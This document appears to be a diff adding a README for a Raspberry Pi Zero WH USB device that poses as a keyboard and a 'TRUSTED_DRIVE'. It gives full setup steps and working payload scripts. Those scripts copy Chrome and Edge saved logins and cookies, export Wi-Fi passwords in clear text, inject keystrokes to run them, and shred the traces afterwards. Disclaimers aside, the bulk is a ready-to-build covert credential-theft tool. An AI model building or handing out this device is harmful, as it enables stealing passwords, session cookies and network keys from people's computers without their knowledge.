@@ -1,0 +1,413 @@
+Raspberry Pi Zero WH Cybersecurity Testing Tool
+https://www.raspberrypi.com/documentation/computers/images/zero-wh-1.jpg
+
+Project Overview
+This tool transforms a Raspberry Pi Zero WH into an automated security testing device that extracts browser credentials, cookies, Wi-Fi data, and system information across Windows, macOS, Android, and iOS devices. All collected data is encrypted and stored in JSON format for security research and educational purposes.
+
+Key Features:
+
+Cross-platform support (Windows, macOS, Android, iOS)
+
+Encrypted JSON data storage
+
+Browser credential and cookie extraction
+
+Wi-Fi and system information collection
+
+Ethical safeguards with visual indicators
+
+Forensic cleanup capabilities
+
+Hardware Requirements
+Raspberry Pi Zero WH
+
+16GB+ MicroSD card
+
+Micro-USB OTG cable
+
+Computer for initial setup
+
+(Optional) USB Wi-Fi dongle
+
+Setup Instructions
+Step 1: Prepare the OS Image
+Download Raspberry Pi OS Lite (Legacy):
+
+bash
+wget https://downloads.raspberrypi.org/raspios_lite_armhf/images/raspios_lite_armhf-2023-12-11/2023-12-11-raspios-bookworm-armhf-lite.img.xz
+Flash to SD card (replace /dev/sdX with your SD card device):
+
+bash
+unxz 2023-12-11-raspios-bookworm-armhf-lite.img.xz
+sudo dd if=2023-12-11-raspios-bookworm-armhf-lite.img of=/dev/sdX bs=4M status=progress
+Enable SSH and Wi-Fi:
+
+bash
+# After flashing, mount the boot partition
+touch /path/to/boot/ssh
+echo -e 'country=US\nctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\nupdate_config=1\nnetwork={\n ssid="YOUR_NETWORK"\n psk="YOUR_PASSWORD"\n}' > /path/to/boot/wpa_supplicant.conf
+Step 2: Configure USB Gadget Mode
+Edit /boot/config.txt (on the Pi after boot or in the SD card's boot partition):
+
+bash
+sudo nano /boot/config.txt
+Add these lines at the end:
+
+bash
+dtoverlay=dwc2,dr_mode=peripheral
+gpu_mem=16
+dtparam=act_led_trigger=none
+dtparam=act_led_activelow=on
+disable_splash=1
+Edit /etc/modules (on the Pi after first boot):
+
+bash
+sudo nano /etc/modules
+Add these lines:
+
+bash
+dwc2
+g_hid
+g_mass_storage
+Step 3: Create Virtual Storage
+bash
+sudo dd if=/dev/zero of=/piusb.bin bs=1M count=2048
+sudo mkfs.exfat -n "TRUSTED_DRIVE" /piusb.bin
+sudo mkdir -p /mnt/usb_share
+echo "/piusb.bin /mnt/usb_share exfat defaults,uid=pi,gid=pi 0 0" | sudo tee -a /etc/fstab
+sudo mount -a
+Step 4: Install Dependencies
+bash
+sudo apt update && sudo apt full-upgrade -y
+sudo apt install -y python3-pip libusb-1.0-0-dev git build-essential
+sudo pip3 install pycryptodomex
+
+# Install iOS tools
+git clone https://github.com/libimobiledevice/libimobiledevice.git
+cd libimobiledevice
+./autogen.sh
+make
+sudo make install
+cd ..
+Step 5: Deploy Payload Files
+Create these files in /mnt/usb_share:
+
+detect_os.py
+
+python
+import sys
+import platform
+
+def detect_os():
+    if sys.platform.startswith('win'):
+        return 'windows'
+    elif sys.platform.startswith('darwin'):
+        return 'macos'
+    elif 'android' in sys.platform.lower():
+        return 'android'
+    elif sys.platform.startswith('linux'):
+        try:
+            with open('/proc/device-tree/model', 'r') as f:
+                if 'iPhone' in f.read():
+                    return 'ios'
+        except:
+            pass
+    return 'unknown'
+
+if __name__ == "__main__":
+    print(detect_os())
+windows_payload.ps1
+
+powershell
+# Create extraction directories
+New-Item -ItemType Directory -Force -Path "D:\chrome"
+New-Item -ItemType Directory -Force -Path "D:\edge"
+
+# Chrome data extraction
+$chrome_path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+Copy-Item "$chrome_path\Login Data" "D:\chrome\creds.db" -ErrorAction SilentlyContinue
+Copy-Item "$chrome_path\Cookies" "D:\chrome\cookies.db" -ErrorAction SilentlyContinue
+
+# Edge data extraction
+$edge_path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+Copy-Item "$edge_path\Login Data" "D:\edge\creds.db" -ErrorAction SilentlyContinue
+Copy-Item "$edge_path\Cookies" "D:\edge\cookies.db" -ErrorAction SilentlyContinue
+
+# Wi-Fi extraction
+netsh wlan export profile key=clear folder=D:\wifi\
+
+# System info
+systeminfo > D:\system_info.txt
+ipconfig /all >> D:\system_info.txt
+macos_payload.sh
+
+bash
+#!/bin/bash
+
+# Create extraction directories
+mkdir -p "/Volumes/TRUSTED_DRIVE/chrome"
+mkdir -p "/Volumes/TRUSTED_DRIVE/edge"
+
+# Chrome data
+chrome_path="$HOME/Library/Application Support/Google/Chrome/Default"
+cp "$chrome_path/Login Data" "/Volumes/TRUSTED_DRIVE/chrome/creds.db" 2>/dev/null
+cp "$chrome_path/Cookies" "/Volumes/TRUSTED_DRIVE/chrome/cookies.db" 2>/dev/null
+
+# Edge data
+edge_path="$HOME/Library/Application Support/Microsoft Edge/Default"
+cp "$edge_path/Login Data" "/Volumes/TRUSTED_DRIVE/edge/creds.db" 2>/dev/null
+cp "$edge_path/Cookies" "/Volumes/TRUSTED_DRIVE/edge/cookies.db" 2>/dev/null
+
+# System info
+system_profiler > "/Volumes/TRUSTED_DRIVE/system_info.txt"
+encrypt_data.py
+
+python
+import json
+import os
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+from Crypto.Random import get_random_bytes
+from datetime import datetime
+
+DISCLAIMER = "COLLECTED FOR SECURITY RESEARCH ONLY - UNAUTHORIZED USE IS ILLEGAL"
+
+def get_pi_serial():
+    try:
+        with open('/proc/cpuinfo', 'r') as f:
+            for line in f:
+                if line.startswith('Serial'):
+                    return line.split(':')[1].strip()
+    except:
+        return "UNKNOWN_SERIAL"
+
+def encrypt_data(data, password):
+    salt = get_random_bytes(16)
+    key = PBKDF2(password, salt, dkLen=32, count=100000)
+    cipher = AES.new(key, AES.MODE_GCM)
+    ciphertext, tag = cipher.encrypt_and_digest(json.dumps(data).encode())
+    return salt + cipher.nonce + tag + ciphertext
+
+if __name__ == "__main__":
+    pi_serial = get_pi_serial()
+    data = {
+        "device_id": pi_serial,
+        "timestamp": datetime.utcnow().isoformat() + "Z",
+        "disclaimer": DISCLAIMER,
+        "os_type": os.getenv("OS_TYPE", "unknown"),
+        "data": {}
+    }
+    
+    encrypted = encrypt_data(data, pi_serial)
+    
+    with open("/mnt/usb_share/comp_data.enc", "ab") as f:
+        f.write(encrypted)
+Make scripts executable:
+
+bash
+sudo chmod +x /mnt/usb_share/*.sh
+sudo chmod +x /mnt/usb_share/*.py
+Step 6: Configure Autorunner Service
+Create /usr/bin/payload_runner.sh:
+
+bash
+#!/bin/bash
+
+# Ethical LED indicator (GPIO 17)
+echo 17 > /sys/class/gpio/export
+echo out > /sys/class/gpio/gpio17/direction
+for i in {1..3}; do
+    echo 1 > /sys/class/gpio/gpio17/value
+    sleep 0.2
+    echo 0 > /sys/class/gpio/gpio17/value
+    sleep 0.2
+done
+
+# Mount virtual storage
+mount -a
+
+# Detect OS
+OS=$(python3 /mnt/usb_share/detect_os.py)
+export OS_TYPE="$OS"
+
+# Execute payload
+case $OS in
+    windows)
+        # Simulate Win+R to open Run dialog
+        echo -ne "\x00\x00\x08\x00\x00\x00\x00\x00" > /dev/hidg0  # Windows key
+        sleep 0.2
+        echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00" > /dev/hidg0
+        sleep 0.2
+        echo -ne "\x00\x00\x15\x00\x00\x00\x00\x00" > /dev/hidg0  # R key
+        sleep 0.2
+        echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00" > /dev/hidg0
+        sleep 1
+        
+        # Type PowerShell command
+        echo -ne "\x00\x00\x13\x00\x00\x00\x00\x00" > /dev/hidg0  # P key
+        sleep 0.1
+        echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00" > /dev/hidg0
+        # ... (complete typing the command)
+        ;;
+    macos)
+        # Simulate Command+Space
+        echo -ne "\x00\x00\x08\x00\x00\x00\x00\x00" > /dev/hidg0  # Command key
+        sleep 0.2
+        echo -ne "\x00\x00\x2c\x00\x00\x00\x00\x00" > /dev/hidg0  # Space key
+        sleep 0.2
+        echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00" > /dev/hidg0
+        sleep 1
+        
+        # Type to open Terminal
+        echo -ne "\x00\x00\x17\x00\x00\x00\x00\x00" > /dev/hidg0  # T key
+        sleep 0.1
+        echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00" > /dev/hidg0
+        # ... (complete typing "Terminal")
+        ;;
+esac
+
+# Wait for payload completion
+sleep 20
+
+# Encrypt and clean up
+python3 /mnt/usb_share/encrypt_data.py
+find /mnt/usb_share -maxdepth 1 -type f -not -name "comp_data.enc" -exec shred -u {} \;
+umount /mnt/usb_share
+Make executable:
+
+bash
+sudo chmod +x /usr/bin/payload_runner.sh
+Create service file /etc/systemd/system/cyber_payload.service:
+
+ini
+[Unit]
+Description=Cybersecurity Payload Service
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/payload_runner.sh
+Restart=on-failure
+RestartSec=5
+Environment=PYTHONUNBUFFERED=1
+
+[Install]
+WantedBy=multi-user.target
+Enable the service:
+
+bash
+sudo systemctl daemon-reload
+sudo systemctl enable cyber_payload.service
+Step 7: Final Configuration
+bash
+# Disable unnecessary services
+sudo systemctl disable bluetooth.service
+sudo systemctl disable hciuart.service
+sudo systemctl disable avahi-daemon.service
+
+# Disable activity LED
+echo 0 | sudo tee /sys/class/leds/led0/brightness
+echo none | sudo tee /sys/class/leds/led0/trigger
+
+# Add to /etc/rc.local before exit 0
+sudo sed -i '/^exit 0/i mount -a\nsystemctl start cyber_payload.service' /etc/rc.local
+
+# Cleanup and reboot
+sudo umount /mnt/usb_share
+sudo reboot
+Usage Instructions
+Plug the Pi Zero WH into target device using OTG cable
+
+Observe LED blink pattern (3 blinks = ethical warning)
+
+Wait 30 seconds for extraction to complete
+
+Unplug the Pi
+
+Plug Pi into your analysis computer
+
+To access collected data:
+
+Mount the virtual storage:
+
+bash
+sudo mount /dev/sdX2 /mnt/analysis  # Replace sdX with your device
+Decrypt the data file (use the Pi's serial as password):
+
+python
+# Save as decrypt_data.py
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+
+def decrypt_data(encrypted, password):
+    salt = encrypted[:16]
+    nonce = encrypted[16:32]
+    tag = encrypted[32:48]
+    ciphertext = encrypted[48:]
+    
+    key = PBKDF2(password, salt, dkLen=32, count=100000)
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    return cipher.decrypt_and_verify(ciphertext, tag)
+
+pi_serial = "YOUR_PI_SERIAL"  # Replace with your Pi's serial
+with open("comp_data.enc", "rb") as f:
+    encrypted_data = f.read()
+    
+decrypted = decrypt_data(encrypted_data, pi_serial)
+print(decrypted.decode())
+Ethical Considerations
+Always obtain explicit permission before testing on any device
+
+The LED blink pattern serves as a visual ethical warning
+
+All collected data contains an embedded disclaimer
+
+Data is encrypted using the Pi's unique serial number
+
+No persistence mechanisms are implemented
+
+Temporary files are securely erased after execution
+
+Legal Disclaimer
+This tool is for educational purposes only. Unauthorized use on systems without explicit permission is illegal. The developers assume no liability for misuse of this tool. Users must comply with all applicable laws including:
+
+Computer Fraud and Abuse Act (US)
+
+Computer Misuse Act (UK)
+
+General Data Protection Regulation (EU)
+
+Troubleshooting
+Problem: USB storage not appearing
+Solution:
+
+bash
+sudo umount /mnt/usb_share
+sudo mkfs.exfat -n "TRUSTED_DRIVE" /piusb.bin
+sudo mount -a
+Problem: Service not starting
+Solution:
+
+bash
+sudo systemctl status cyber_payload.service
+journalctl -u cyber_payload.service -b
+Problem: Keyboard not working
+Solution:
+
+Verify modules loaded:
+
+bash
+lsmod | grep -e dwc2 -e g_hid
+Check HID gadget:
+
+bash
+ls /sys/kernel/config/usb_gadget/
+Support
+For additional support, create an issue on the GitHub repository. Please include:
+
+Raspberry Pi model
+
+OS version of target device
+
+Error logs from journalctl -u cyber_payload.service -b
+
+Note: This project is for educational purposes only. Always follow ethical guidelines and obtain proper authorization before testing.
